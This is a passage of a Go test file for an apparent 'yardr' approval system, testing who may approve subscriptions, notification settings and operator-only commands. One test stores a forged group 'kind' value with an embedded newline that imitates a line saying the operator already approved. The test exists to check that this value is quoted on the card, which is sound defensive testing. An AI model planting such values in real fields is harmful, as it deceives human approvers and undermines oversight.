		{"user set mckean env_file=", "user set with env_file= is typed by the operator"},
		{"user set mckean tell=mail notify=ntfy", "user set with notify= is typed by the operator"},
		{"user set mckean tell=mail env_file=/tmp/mckean.env", "user set with env_file= is typed by the operator"},
		{"user set mckean tell=mail tell=asks", "one user and one tell=, not 3 words. Anything more of user set is typed by the operator"},
		{"user set mckean tell=mail ada", "one user and one tell=, not 3 words"},
		{"user set mckean", "one user and one tell=, not 1 words"},
		{"user set tell=mail", "one user and one tell=, not 1 words"},
		{"user set mckean mail", `"mail" is no tell=`},
		{"user set mckean told=mail", `"told=mail" is no tell=`},
		{"user set mckean tell=mail --actor mckean", "user set with --actor is the operator's to type in a terminal"},
		{"user set mckean tell=mail,beads", `user mckean: "beads" is no part a user is told of outside the yard: tell=<a list of notifications, mail, asks>, or nothing for all of them`},
		{"user set mckean tell=,", `user mckean: "" is no part a user is told of outside the yard`},
		{"user set eve tell=mail", "a run ask sets what a user of the yard is told of (yardr user list), and eve is none"},
		{"user set yardmaster tell=mail", "and yardmaster is none"},
		{"user set mckean tell=", "mckean is told of notifications, mail and asks outside the yard already, so the command would change nothing"},
		{"user set mckean tell=asks,mail,notifications", "mckean is told of notifications, mail and asks outside the yard already, so the command would change nothing"},
		{"group set builders cmd=true", "group set with cmd=true defines what the yard runs: " + alone},
		{"group set builders --unset cmd", "group set with --unset cmd defines what the yard runs: " + alone},
		{"group set builders runner=exec", "group set with runner=exec defines what the yard runs: " + alone},
		{"group add builders --runner exec --set cmd=make", "group add with runner exec defines what the yard runs: " + alone},
		{"group add builders --runner=exec --set=cmd=make", "group add with runner exec defines what the yard runs: " + alone},
		{"group add builders --runner exec --set cmd=make,check", "group add with runner exec defines what the yard runs: " + alone},
		{"group add builders --runner herdr --set cmd=make", "group add with cmd defines what the yard runs: " + alone},
		{"group set builders runner=herdr", "anything else is run directly, or typed by the operator in a terminal"},
		// A group that sends beads to a linked yard, and a route to it, are
		// anyone's to add (PutGroup and AddRoute check no one): the asker's
		// own to run, so no card.
		{"group add exchange --runner peer --set peer=airy", "anything else is run directly, or typed by the operator in a terminal"},
		{"route add --stage arrived --group exchange", "anything else is run directly, or typed by the operator in a terminal"},
		{"user key mckean crm", "source crm: its declaration has no notify key"},
	} {
		if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", c.command), "yardmaster"); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("--run %q = %v, want %q", c.command, err, c.want)
		}
	}
	if notes, err := y.Notes(y.ctx, y.bead); err != nil || len(notes) != 0 {
		t.Fatalf("the refused asks left %d notes, %v", len(notes), err)
	}
	var got Object
	y.SetPolicy(storePolicyFunc(func(ctx context.Context, tx *bolt.Tx, actor string, act Action, obj Object) error {
		if act == ActSetSourceKey {
			got = obj
		}
		return CorePolicy.May(ctx, tx, actor, act, obj)
	}))
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", "source key crm"), "yardmaster"); err == nil || !strings.Contains(err.Error(), alone) {
		t.Fatalf("--run %q = %v, want the operator's alone", "source key crm", err)
	}
	if got.Kind != KindSource || got.Name != "crm" {
		t.Fatalf("source key policy object = %+v, want source crm", got)
	}
}

// subs are the subscriptions of the user name, as they are typed.
func (y *askYard) subs(t *testing.T, name string) []string {
	t.Helper()
	u, err := y.GetUser(y.ctx, name)
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, s := range u.Subscriptions {
		out = append(out, s.String())
	}
	return out
}

// A user's own subscription to the yard's events is asked of the user or of
// the operator, and the one asked approves it: the yard says what will land
// in the user's inbox and whether it is sent on outside the yard, and the
// approval subscribes under the check a subscription typed at a terminal
// has. Nobody else approves, and the user or the operator takes it back.
func TestRunAskSubscribe(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	// It began here: the yardmaster could not subscribe the operator.
	if err := y.AddSubscription(y.ctx, "mckean", Subscription{Source: SourceYardr, Scope: ScopeAll, Where: map[string]string{"state": StateDone}}, "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "a crew member does not decide what a person is told: mckean subscribes themselves, or the operator does it for them") {
		t.Fatalf("the test wants the check a subscription has: %v", err)
	}
	seq := y.ask(t, listAsk("mckean", "yardr subscribe mckean yardr --where label=ui --where depot=yardr --where state=done --where label=web --where label=ui"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	want := AskRun{
		Argv:        []string{"subscribe", "mckean", "yardr", "--done", "--where", "depot=yardr", "--where", "label=ui", "--where", "label=web"},
		Description: "Deliver a source's events to a crew member's inbox, or a user's as notifications (no arguments: who is told what)",
		Does: []string{
			"mckean gets a line among the notifications of their inbox for each bead that becomes done where depot is yardr, and label is ui or web (the subscription yardr all depot=yardr label=ui label=web state=done). They have no such subscription now.",
			"Nothing sends it on outside the yard: no source tells mckean of notifications there.",
		},
		Back:   "yardr unsubscribe mckean yardr --where depot=yardr --where label=ui --where label=web --where state=done",
		BackBy: "mckean or the operator",
		Seen:   map[string]string{"user mckean": seen("", "", []string(nil))},
	}
	if !slices.Equal(run.Argv, want.Argv) || !slices.Equal(run.Does, want.Does) || run.Back != want.Back || run.BackBy != want.BackBy || !sameMap(run.Seen, want.Seen) {
		t.Fatalf("the ask stores\n%+v\nwant\n%+v", run, want)
	}
	card := y.asked(t, seq).Lines()
	for _, line := range []string{
		"  when you approve, the yard runs this as mckean, and nothing else:",
		"      yardr subscribe mckean yardr --done --where depot=yardr --where label=ui --where label=web",
		"  what the command does: " + want.Description,
		"  the yard says: " + want.Does[1],
		"  mckean or the operator can take it back: " + want.Back,
	} {
		if !slices.Contains(card, line) {
			t.Errorf("the card lacks %q:\n%s", line, strings.Join(card, "\n"))
		}
	}
	const whose = "approving this command is mckean's, whom it was asked of: the yard runs it as them; "
	for actor, want := range map[string]string{"yardmaster": whose + "yardmaster is a crew member", "ada": whose + "this is ada", "": whose + "this is nobody"} {
		if _, err := y.ApproveAsk(y.ctx, y.bead, seq, actor, false, nil); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("an approval by %q = %v, want %q", actor, err, want)
		}
	}
	if got := y.subs(t, "mckean"); len(got) != 0 {
		t.Fatalf("refused approvals subscribed mckean to %v", got)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	const sub = "yardr all depot=yardr label=ui label=web state=done"
	if done.Result != "mckean subscribed: "+sub || !slices.Equal(y.subs(t, "mckean"), []string{sub}) {
		t.Fatalf("the approval printed %q, and mckean subscribes to %v", done.Result, y.subs(t, "mckean"))
	}
	evs, _ := y.EventsOfKind(y.ctx, "subscribed", 10)
	if len(evs) != 1 || evs[0].Data["user"] != "mckean" || evs[0].Data["subscription"] != sub {
		t.Fatalf("subscribed events = %+v", evs)
	}
	y.approved(t, evs[0], seq)
	// The command the card names takes exactly that back, and a crew
	// member does not run it.
	where := map[string]string{"depot": "yardr", "label": JoinWhere([]string{"ui", "web"}), "state": StateDone}
	if _, err := y.RemoveSubscriptions(y.ctx, "mckean", SourceYardr, "", where, "yardmaster"); err == nil {
		t.Fatal("a crew member took a user's subscription back")
	}
	if n, err := y.RemoveSubscriptions(y.ctx, "mckean", SourceYardr, "", where, "mckean"); err != nil || n != 1 {
		t.Fatalf("taking it back = %d, %v", n, err)
	}
}

// A subscription of another user is theirs to approve, or the operator's
// for them: the ask is put to one of the two and to nobody else, the one
// asked approves it, and the store's own check runs under the approval.
func TestRunAskSubscribeIsTheUsersOrTheOperators(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	if _, err := y.AddUser(y.ctx, "bo", "mckean"); err != nil {
		t.Fatal(err)
	}
	const command = "subscribe ada yardr --done"
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("bo", command), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "this command is ada's to approve, or the operator's (mckean) for them: the yard runs it as the one who approves, so bo cannot be asked to") {
		t.Fatalf("an ask of a third user = %v", err)
	}
	own := y.ask(t, listAsk("ada", command), "yardmaster")
	if card := y.asked(t, own).Lines(); !slices.Contains(card, "  when you approve, the yard runs this as ada, and nothing else:") ||
		!slices.Contains(card, "  ada or the operator can take it back: yardr unsubscribe ada yardr --where state=done") {
		t.Fatalf("the card:\n%s", strings.Join(card, "\n"))
	}
	// The operator is not the one asked.
	if _, err := y.ApproveAsk(y.ctx, y.bead, own, "mckean", false, nil); err == nil || !strings.Contains(err.Error(), "approving this command is ada's, whom it was asked of") {
		t.Fatalf("the operator's approval of ada's ask = %v", err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, own, "ada", false, nil); err != nil {
		t.Fatal(err)
	}
	evs, _ := y.EventsOfKind(y.ctx, "subscribed", 10)
	if len(evs) != 1 || evs[0].Actor != "ada" || !slices.Equal(y.subs(t, "ada"), []string{"yardr all state=done"}) {
		t.Fatalf("ada's own approval left %+v and %v", evs, y.subs(t, "ada"))
	}
	// Once made, the same ask would change nothing.
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("ada", command), "yardmaster"); err == nil || !strings.Contains(err.Error(), "ada is subscribed to yardr all state=done already, so the command would change nothing") {
		t.Fatalf("an ask for a subscription ada has = %v", err)
	}
	// The operator, asked for another of ada's, approves it for them.
	for_ := y.ask(t, listAsk("mckean", "subscribe ada yardr --where kind=held"), "yardmaster")
	if _, err := y.ApproveAsk(y.ctx, y.bead, for_, "ada", false, nil); err == nil || !strings.Contains(err.Error(), "approving this command is mckean's, whom it was asked of") {
		t.Fatalf("ada's approval of the operator's ask = %v", err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, for_, "mckean", false, nil); err != nil {
		t.Fatal(err)
	}
	if got := y.subs(t, "ada"); !slices.Equal(got, []string{"yardr all state=done", "yardr all kind=held"}) {
		t.Fatalf("ada subscribes to %v", got)
	}
	// The approval runs under the check a subscription has, as it stands
	// when it runs: an operator who is one no more subscribes nobody else.
	late := y.ask(t, listAsk("mckean", "subscribe ada yardr --where kind=closed"), "yardmaster")
	if err := y.SetSetting(y.ctx, OperatorSetting, "bo", "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserRole: RoleMember}, "bo"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, late, "mckean", false, nil); err == nil || !strings.Contains(err.Error(), "this command is ada's own to approve, or an operator's for them, and mckean is neither now") {
		t.Fatalf("an approval by a former operator = %v", err)
	}
	if got := y.subs(t, "ada"); len(got) != 2 {
		t.Fatalf("the refused approval left ada with %v", got)
	}
	// A yard that names no operator has the user alone.
	y.noOperator(t, "bo")
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", "subscribe ada yardr --where kind=closed"), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "this command is ada's to approve: the yard runs it as the one who approves, so mckean cannot be asked to") {
		t.Fatalf("an ask of another user in a yard with no operator = %v", err)
	}
	alone := y.ask(t, listAsk("ada", "subscribe ada yardr --where kind=closed"), "yardmaster")
	if _, err := y.ApproveAsk(y.ctx, y.bead, alone, "ada", false, nil); err != nil || len(y.subs(t, "ada")) != 3 {
		t.Fatalf("ada's own approval in a yard with no operator = %v, and ada subscribes to %v", err, y.subs(t, "ada"))
	}
}

// The card of a subscription says that it reaches the user outside the
// yard where a source tells them of notifications, and an approval is held
// to where the user is told: set anew, the ask is asked again. A
// subscription the user made in between is on the card too.
func TestRunAskSubscribeIsHeldToWhereTheUserIsTold(t *testing.T) {
	// Sequential: stubs notifyAdapters, and uses the fake clock (via newAskYard).
	y := listYard(t)
	notifyAdapters = func() []string { return []string{"ntfy"} }
	t.Cleanup(func() { notifyAdapters = func() []string { return nil } })
	plain := y.ask(t, listAsk("mckean", "subscribe mckean yardr --done"), "yardmaster")
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserNotify: "ntfy"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, plain, "ask "+jsonNumber(int(plain))+" was written when mckean was told outside the yard another way: that was set since (user_set, "+y.now.Local().Format("2 Jan 15:04")+", by mckean). ")

	told := y.ask(t, listAsk("mckean", "subscribe mckean yardr --done"), "yardmaster")
	if does := y.asked(t, told).Ask.Run.Does; len(does) != 2 ||
		does[1] != "Each is also sent to mckean outside the yard, through the source ntfy: it reaches their phone, or wherever ntfy tells them." {
		t.Fatalf("the card of a user who is told outside = %q", does)
	}
	// Told of mail alone, nothing of a notification leaves the yard.
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserTell: "mail"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, told, "was told outside the yard another way")
	quiet := y.ask(t, listAsk("mckean", "subscribe mckean yardr --done"), "yardmaster")
	if does := y.asked(t, quiet).Ask.Run.Does; does[1] != "Nothing sends it on outside the yard: no source tells mckean of notifications there." {
		t.Fatalf("the card of a user told of mail alone = %q", does)
	}
	if err := y.AddSubscription(y.ctx, "mckean", Subscription{Source: SourceYardr, Scope: ScopeAll, Where: map[string]string{"state": StateDone}}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, quiet, "They have that subscription already.\" now: the card is from before that changed. ")
	if got := y.subs(t, "mckean"); len(got) != 1 {
		t.Fatalf("mckean subscribes to %v", got)
	}
}

// tell is what the user name is told of outside the yard, as it is stored.
func (y *askYard) tell(t *testing.T, name string) string {
	t.Helper()
	u, err := y.GetUser(y.ctx, name)
	if err != nil {
		t.Fatal(err)
	}
	return strings.Join(u.Tell, ",")
}

// Which parts a user's phone is told of is asked of the user or of the
// operator, as a subscription is: the yard says of which parts the user is
// told now and of which then, and that no source tells them yet, and the
// approval sets it under the check the setting typed at a terminal has.
// Nobody else approves, and the card names the command that sets the parts
// that stood.
func TestRunAskUserTell(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	// It began here: the yardmaster could only mail the line.
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserTell: "notifications,asks"}, "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "where mckean is told outside the yard is set by mckean: what lands in their inbox goes there; yardmaster is a crew member") {
		t.Fatalf("the test wants the check the setting has: %v", err)
	}
	seq := y.ask(t, listAsk("mckean", "yardr user set mckean tell=asks,notifications,asks"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	want := AskRun{
		Argv:        []string{"user", "set", "mckean", "tell=notifications,asks"},
		Description: "Set where, how and what a source tells a user",
		Does: []string{
			"mckean has no notify source, so nothing tells them outside the yard, and the change tells them nothing until one is set (yardr user set mckean notify=<source>). A source would then tell them of notifications and asks; it would tell them of notifications, mail and asks as things stand.",
			"What still waited to be told of mail is dropped, and is not told later. Their inbox and their queue of decisions in the yard are filled as before.",
		},
		Back:   "yardr user set mckean tell=",
		BackBy: "mckean or the operator",
		Seen:   map[string]string{"user mckean": seen("", "", []string(nil))},
	}
	if !slices.Equal(run.Argv, want.Argv) || !slices.Equal(run.Does, want.Does) || run.Back != want.Back || run.BackBy != want.BackBy || !sameMap(run.Seen, want.Seen) {
		t.Fatalf("the ask stores\n%+v\nwant\n%+v", run, want)
	}
	card := y.asked(t, seq).Lines()
	for _, line := range []string{
		"  when you approve, the yard runs this as mckean, and nothing else:",
		"      yardr user set mckean tell=notifications,asks",
		"  what the command does: " + want.Description,
		"  the yard says: " + want.Does[0],
		"  the yard says: " + want.Does[1],
		"  mckean or the operator can take it back: yardr user set mckean tell=",
	} {
		if !slices.Contains(card, line) {
			t.Errorf("the card lacks %q:\n%s", line, strings.Join(card, "\n"))
		}
	}
	// A client is sent the fields it is sent of a subscription, and no
	// other: it draws the card of this row with what it has.
	sub := y.ask(t, listAsk("mckean", "subscribe mckean yardr --done"), "yardmaster")
	fields := func(seq uint64) []string {
		text, err := json.Marshal(y.asked(t, seq).Ask.proposed())
		if err != nil {
			t.Fatal(err)
		}
		var m map[string]json.RawMessage
		if err := json.Unmarshal(text, &m); err != nil {
			t.Fatal(err)
		}
		return slices.Sorted(maps.Keys(m))
	}
	if got, want := fields(seq), fields(sub); !slices.Equal(got, want) || !slices.Equal(got, []string{"argv", "back", "back_by", "command", "description", "does"}) {
		t.Fatalf("a client is sent %v of this row, and %v of a subscription", got, want)
	}
	const whose = "approving this command is mckean's, whom it was asked of: the yard runs it as them; "
	for actor, want := range map[string]string{"yardmaster": whose + "yardmaster is a crew member", "ada": whose + "this is ada", "": whose + "this is nobody"} {
		if _, err := y.ApproveAsk(y.ctx, y.bead, seq, actor, false, nil); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("an approval by %q = %v, want %q", actor, err, want)
		}
	}
	if got := y.tell(t, "mckean"); got != "" {
		t.Fatalf("refused approvals set mckean's tell to %q", got)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if want := "user mckean: told outside the yard: nowhere (tell notifications,asks is set, and no notify)"; done.Result != want || y.tell(t, "mckean") != "notifications,asks" {
		t.Fatalf("the approval printed %q, and mckean's tell is %q", done.Result, y.tell(t, "mckean"))
	}
	evs, _ := y.EventsOfKind(y.ctx, "user_set", 10)
	if len(evs) != 1 || evs[0].Data["user"] != "mckean" || evs[0].Data[UserTell] != "notifications,asks" {
		t.Fatalf("user_set events = %+v", evs)
	}
	y.approved(t, evs[0], seq)
	// Once set, the same ask would change nothing, however it is typed.
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", "user set mckean tell=asks,notifications"), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "mckean is told of notifications and asks outside the yard already, so the command would change nothing") {
		t.Fatalf("an ask for the tell that stands = %v", err)
	}
	// All three again is asked with nothing after tell=, and drops nothing;
	// the command that takes it back sets the parts that stand.
	all := y.ask(t, listAsk("mckean", "user set mckean tell="), "yardmaster")
	run = *y.asked(t, all).Ask.Run
	if !slices.Equal(run.Argv, []string{"user", "set", "mckean", "tell="}) || len(run.Does) != 1 || run.Back != "yardr user set mckean tell=notifications,asks" ||
		!strings.HasSuffix(run.Does[0], "A source would then tell them of notifications, mail and asks; it would tell them of notifications and asks as things stand.") {
		t.Fatalf("the ask for all three stores %+v", run)
	}
	// The command the card names takes exactly that back, and a crew
	// member does not run it.
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserTell: ""}, "yardmaster"); err == nil {
		t.Fatal("a crew member took a user's tell back")
	}
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserTell: ""}, "mckean"); err != nil || y.tell(t, "mckean") != "" {
		t.Fatalf("taking it back = %v, and mckean's tell is %q", err, y.tell(t, "mckean"))
	}
}

// What another user is told of is theirs to approve, or the operator's for
// them: the ask is put to one of the two and to nobody else, the one asked
// approves it, and the change is written as the one who approved.
func TestRunAskUserTellIsTheUsersOrTheOperators(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	if _, err := y.AddUser(y.ctx, "bo", "mckean"); err != nil {
		t.Fatal(err)
	}
	const command = "user set ada tell=asks"
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("bo", command), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "this command is ada's to approve, or the operator's (mckean) for them: the yard runs it as the one who approves, so bo cannot be asked to") {
		t.Fatalf("an ask of a third user = %v", err)
	}
	own := y.ask(t, listAsk("ada", command), "yardmaster")
	if card := y.asked(t, own).Lines(); !slices.Contains(card, "  when you approve, the yard runs this as ada, and nothing else:") ||
		!slices.Contains(card, "  ada or the operator can take it back: yardr user set ada tell=") {
		t.Fatalf("the card:\n%s", strings.Join(card, "\n"))
	}
	// The operator is not the one asked.
	if _, err := y.ApproveAsk(y.ctx, y.bead, own, "mckean", false, nil); err == nil || !strings.Contains(err.Error(), "approving this command is ada's, whom it was asked of") {
		t.Fatalf("the operator's approval of ada's ask = %v", err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, own, "ada", false, nil); err != nil {
		t.Fatal(err)
	}
	evs, _ := y.EventsOfKind(y.ctx, "user_set", 10)
	if len(evs) != 1 || evs[0].Actor != "ada" || y.tell(t, "ada") != "asks" {
		t.Fatalf("ada's own approval left %+v and tell %q", evs, y.tell(t, "ada"))
	}
	// The operator, asked for another of ada's, approves it for them.
	for_ := y.ask(t, listAsk("mckean", "user set ada tell=mail,asks"), "yardmaster")
	if _, err := y.ApproveAsk(y.ctx, y.bead, for_, "ada", false, nil); err == nil || !strings.Contains(err.Error(), "approving this command is mckean's, whom it was asked of") {
		t.Fatalf("ada's approval of the operator's ask = %v", err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, for_, "mckean", false, nil); err != nil {
		t.Fatal(err)
	}
	evs, _ = y.EventsOfKind(y.ctx, "user_set", 10)
	if len(evs) != 2 || evs[1].Actor != "mckean" || y.tell(t, "ada") != "mail,asks" {
		t.Fatalf("the operator's approval left %+v and tell %q", evs, y.tell(t, "ada"))
	}
	y.approved(t, evs[1], for_)
	// The approval runs under the check the setting has, as it stands when
	// it runs: an operator who is one no more sets nobody else's.
	late := y.ask(t, listAsk("mckean", "user set ada tell=mail"), "yardmaster")
	if err := y.SetSetting(y.ctx, OperatorSetting, "bo", "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserRole: RoleMember}, "bo"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, late, "mckean", false, nil); err == nil || !strings.Contains(err.Error(), "this command is ada's own to approve, or an operator's for them, and mckean is neither now") {
		t.Fatalf("an approval by a former operator = %v", err)
	}
	if got := y.tell(t, "ada"); got != "mail,asks" {
		t.Fatalf("the refused approval left ada's tell %q", got)
	}
}

// The card says through which source the user is told, and an approval is
// held to the user's tell and notify as they were: set anew in between,
// the ask is asked again and nothing is set.
func TestRunAskUserTellIsHeldToWhereTheUserIsTold(t *testing.T) {
	// Sequential: stubs notifyAdapters, and uses the fake clock (via newAskYard).
	y := listYard(t)
	notifyAdapters = func() []string { return []string{"ntfy"} }
	t.Cleanup(func() { notifyAdapters = func() []string { return nil } })
	const command = "user set mckean tell=notifications,asks"
	const stale = " was written when mckean was told outside the yard another way: that was set since (user_set, "
	plain := y.ask(t, listAsk("mckean", command), "yardmaster")
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserNotify: "ntfy"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, plain, "ask "+jsonNumber(int(plain))+stale+y.now.Local().Format("2 Jan 15:04")+", by mckean). ")

	told := y.ask(t, listAsk("mckean", command), "yardmaster")
	if does := y.asked(t, told).Ask.Run.Does; len(does) != 2 ||
		does[0] != "the source ntfy tells mckean outside the yard of notifications and asks: on their phone, or wherever ntfy tells them. It tells them of notifications, mail and asks now." ||
		!strings.HasPrefix(does[1], "What still waited to be told of mail is dropped") {
		t.Fatalf("the card of a user who is told outside = %q", does)
	}
	// The user set another tell in between: the card's "now" is no more.
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserTell: "mail"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, told, "ask "+jsonNumber(int(told))+stale)
	// And the very tell that was asked: nothing is left to run.
	again := y.ask(t, listAsk("mckean", command), "yardmaster")
	if does := y.asked(t, again).Ask.Run.Does; len(does) != 2 || !strings.HasSuffix(does[0], "It tells them of mail now.") ||
		!strings.HasPrefix(does[1], "What still waited to be told of mail is dropped") || y.asked(t, again).Ask.Run.Back != "yardr user set mckean tell=mail" {
		t.Fatalf("the card of a user told of mail alone = %q", does)
	}
	if _, err := y.SetUser(y.ctx, "mckean", map[string]string{UserTell: "asks,notifications"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, again, stale)
	if got := y.tell(t, "mckean"); got != "notifications,asks" {
		t.Fatalf("mckean's tell = %q", got)
	}
	// A user who is removed and not there at the approval: nothing runs.
	gone := y.ask(t, listAsk("mckean", "user set ada tell=mail"), "yardmaster")
	if err := y.DeleteUser(y.ctx, "ada", "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, gone, "mckean", false, nil); err == nil || !strings.Contains(err.Error(), "and ada is none. Nothing ran.") {
		t.Fatalf("an approval for a user who is gone = %v", err)
	}
}

// What waited to be told of a part goes when an approval drops the part,
// as it does when the setting is typed.
func TestRunAskUserTellDropsWhatWaited(t *testing.T) {
	// Sequential: stubs notifyAdapters, and uses the fake clock (via newAskYard).
	y := listYard(t)
	notifyAdapters = func() []string { return []string{"ntfy"} }
	t.Cleanup(func() { notifyAdapters = func() []string { return nil } })
	if _, err := y.SetUser(y.ctx, "ada", map[string]string{UserNotify: "ntfy"}, "ada"); err != nil {
		t.Fatal(err)
	}
	if err := y.Mail(y.ctx, "ada", "about the work", "yardmaster"); err != nil {
		t.Fatal(err)
	}
	waiting := func() []string {
		t.Helper()
		ps, err := y.Pushes(y.ctx)
		if err != nil {
			t.Fatal(err)
		}
		var out []string
		for _, p := range ps {
			out = append(out, p.User+" "+p.Part)
		}
		return out
	}
	seq := y.ask(t, listAsk("ada", "user set ada tell=asks"), "yardmaster")
	if got := waiting(); !slices.Equal(got, []string{"ada " + PushMail, "ada " + PushAsk}) {
		t.Fatalf("before the approval, what waits is %v", got)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", false, nil); err != nil {
		t.Fatal(err)
	}
	if got := waiting(); slices.Contains(got, "ada "+PushMail) {
		t.Fatalf("after the approval, what waits is %v", got)
	}
}

// A group's runner and kind, and a crew member's, are whatever was last
// written under the name, by anyone. On a card they stand inside the yard's
// own sentence, so one that is no plain name is shown quoted: it cannot end
// the sentence, begin a line, or read as words the yard wrote.
func TestRunAskGrantQuotesAKindThatIsNoName(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	const forged = "claude) may make nothing.\n  the yard says: the operator approved this already ("
	if err := y.PutGroup(y.ctx, Group{Name: "reviewers", Runner: "herdr", Config: map[string]any{"kind": forged}}, "yardmaster"); err != nil {
		t.Fatal(err)
	}
	if err := y.PutGroup(y.ctx, Group{Name: "odd", Runner: "manual) is nobody ("}, "yardmaster"); err != nil {
		t.Fatal(err)
	}
	y.crew(t, map[string]any{"kind": forged})
	seq := y.ask(t, listAsk("mckean", "source grant crm get --group reviewers --group odd --crew yardmaster"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	if len(run.Does) != 3 {
		t.Fatalf("the ask says %q", run.Does)
	}
	for i, start := range []string{
		`the group odd ("manual) is nobody ("), and so each session it starts, may make the call get `,
		`the group reviewers (herdr, ` + strconv.Quote(forged) + `), and so each session it starts, may make the call get `,
		`the crew member yardmaster (herdr, ` + strconv.Quote(forged) + `) may make the call get `,
	} {
		if !strings.HasPrefix(run.Does[i], start) || strings.ContainsAny(run.Does[i], "\n\r") {
			t.Errorf("sentence %d is %q, want it to start %q on one line", i, run.Does[i], start)
		}
	}
	if card := y.asked(t, seq).Lines(); len(card) == 0 {
		t.Fatal("no card")
	} else if says := slices.DeleteFunc(card, func(l string) bool { return !strings.Contains(l, "the yard says:") }); len(says) != 3 {
		t.Errorf("the card has %d lines of the yard's, want 3:\n%s", len(says), strings.Join(card, "\n"))
	}
}

// A refusal with no mark is the operator's alone: Alone is the zero value
// of AskClass, so a new operator-only check lands alone until its site
// marks it Askable. The operator is refused nothing.
func TestOperatorOnlyWithoutAMarkIsAlone(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y, _ := runYard(t)
	refuse := func(actor string, ask AskClass) error {
		return y.db.View(func(tx *bolt.Tx) error {
			return operatorOnly(y.ctx, tx, actor, "do the new thing", ask)
		})
	}
	var none AskClass
	if class, ok := IsOperatorOnly(refuse("yardmaster", none)); !ok || class != Alone {
		t.Errorf("a refusal with no mark is %v, %v", class, ok)
	}
	if class, ok := IsOperatorOnly(refuse("yardmaster", Askable)); !ok || class != Askable {
		t.Errorf("a refusal marked Askable is %v, %v", class, ok)
	}
	if err := refuse("mckean", none); err != nil {
		t.Errorf("the operator is refused their own: %v", err)
	}
}

// Every known setting has an explicit run-ask class, and a setting added
// later is alone until its effect is reviewed and marked Askable.
func TestSettingRunAskClassesAreExplicit(t *testing.T) {
	t.Parallel()
	want := map[string]AskClass{
		OperatorSetting:          Alone,
		YardmasterSetting:        Askable,
		HearerSetting:            Askable,
		StyleSetting:             Askable,
		NoteSetting:              Askable,
		DefaultKindSetting:       Askable,
		DefaultPackSetting:       Alone,
		PermissionsPresetSetting: Alone,
		HookAddrSetting:          Alone,
		HookPublicURLSetting:     Askable,
		EdgeSetting:              Alone,
		RouterAddrSetting:        Alone,
		HostedSetting:            Alone,
		WebAddrSetting:           Alone,
		WebPagesAddrSetting:      Alone,
		WebPagesHostSetting:      Alone,
		WebAsSetting:             Alone,
		WebJWTIssuerSetting:      Alone,
		WebJWTAudienceSetting:    Alone,
		WebJWTJWKSSetting:        Alone,
		WebJWTHeaderSetting:      Alone,
		WebJWTUsersSetting:       Alone,
		BDPAddrSetting:           Alone,
		TimerLimitSetting:        Askable,
		TimerMinEverySetting:     Askable,
		BlobMaxSetting:           Askable,
		FilesMaxSetting:          Alone,
		PeerFileMaxSetting:       Askable,
		BackupEverySetting:       Askable,
		BackupKeepSetting:        Askable,
		BackupDirSetting:         Alone,
		MaxSessionsSetting:       Askable,
		HerdrSessionSetting:      Alone,
		NameSetting:              Askable,
		UpgradeFromSetting:       Alone,
		UpgradeRestoreSetting:    Alone,
		CodesignIdentitySetting:  Alone,
		QuietLandingsSetting:     Alone,
		DiskKeepGBSetting:        Alone,
		PreviewIdleSetting:       Alone,
